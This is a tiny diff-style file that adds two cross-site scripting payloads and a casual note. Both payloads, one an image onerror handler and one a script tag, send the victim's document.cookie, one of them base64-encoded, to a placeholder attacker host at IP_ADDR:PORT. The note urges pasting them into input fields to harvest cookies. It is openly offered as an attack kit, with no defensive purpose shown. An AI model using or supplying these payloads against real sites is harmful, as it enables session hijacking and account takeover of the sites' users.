@@ -1,0 +1,4 @@
+<img src="empty.png" onerror="fetch('http://IP_ADDR:PORT?cookieNUM='+document.cookie); "/>
+<script>var i=new Image(); i.src="http://IP_ADDR:PORT?cookieNUM="+btoa(document.cookie);</script>
+
+pop these into input things, sometimes they can give back nice cookies
